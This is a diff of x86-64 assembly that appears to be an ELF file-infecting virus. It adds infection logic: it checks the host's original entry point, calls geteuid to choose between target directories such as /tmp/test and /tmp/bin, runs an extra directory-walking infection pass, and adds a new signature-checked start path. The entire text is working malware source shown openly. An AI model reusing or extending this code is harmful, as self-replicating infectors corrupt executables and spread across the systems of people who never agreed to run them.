@@ -51,17 +51,30 @@ _start:
 	push r15 ; +104
 	cmp QWORD [rsp + 128], 3
 	je _alternative_start
+	cmp QWORD [rsp + 64], 3
+	je _alternative_start_by_registers
 _continue_normaly:
 ;	lea rax, [rel _o_entry]
 ;	cmp QWORD [rax], 0
 ;	jne _jmp_to_o_entry
 ;;;;;;;;;;;;;;;;;;;;;;
 ;	push 0x000000000000002f ; /
-	mov rax, 0x0000000000000000
+	mov rax, 0
 	push rax
 	push rax
-;	mov rax, 0x747365742f706d74 ; tmp/test
-	mov rax, 0x006e69622f706d74 ; tmp/bin
+	lea r10, [rel _o_entry]
+	cmp QWORD [r10], 0
+	jne _infect_tmp_test
+	mov rax, 107
+	syscall
+	cmp rax, 0
+	jne _infect_tmp_test
+	mov rax, 0
+	jmp _push_it
+_infect_tmp_test:
+	mov rax, 0x747365742f706d74 ; tmp/test
+;	mov rax, 0x006e69622f706d74 ; tmp/bin
+_push_it:
 	push rax
 	mov rdi, rsp
 	mov rsi, rsp
@@ -71,11 +84,12 @@ _continue_normaly:
 	push rsi
 	push rdi
 	call _read_dir
-;	mov BYTE [rsp + 24], 0x32
-;	mov rdi, rsp
-;	mov rsi, rsp
-;	add rsi, 16
-;	call _read_dir
+	lea r10, [rel _o_entry]
+	cmp QWORD [r10], 0
+	je _jmp_end
+	mov BYTE [rsp + 24], 0x32
+	call _read_dir
+_jmp_end:
 	pop rdi
 	pop rdi
 	pop rdi
@@ -98,7 +112,6 @@ _alternative_start:
 	jne _continue_normaly
 	mov rsi, QWORD [rsp + 152]
 	mov rdi, QWORD [rsp + 136]
-;	mov rsi, QWORD [rsp + 160]
 	mov rax, 0
 	push rax
 	push rsi
@@ -107,7 +120,26 @@ _alternative_start:
 	pop rdi
 	pop rdi
 	pop rdi
-	jmp _force_exit
+	lea rax, [rel _force_exit]
+
+_alternative_start_by_registers:
+	mov r10, QWORD [rsp + 72]
+	mov r10, QWORD [r10 + 8]
+	lea r11, [rel _verif]
+	mov r11, QWORD [r11]
+	cmp QWORD [r10], r11
+	jne _continue_normaly
+	mov rsi, QWORD [rsp + 72]
+	mov rsi, QWORD [rsi + 16]
+	mov rax, 0
+	push rax
+	push rsi
+	push rax
+	call _read_dir
+	pop rdi
+	pop rdi
+	pop rdi
+	lea rax, [rel _force_exit]
 
 ;_munmap_thread:
 ;	mov rax, 11
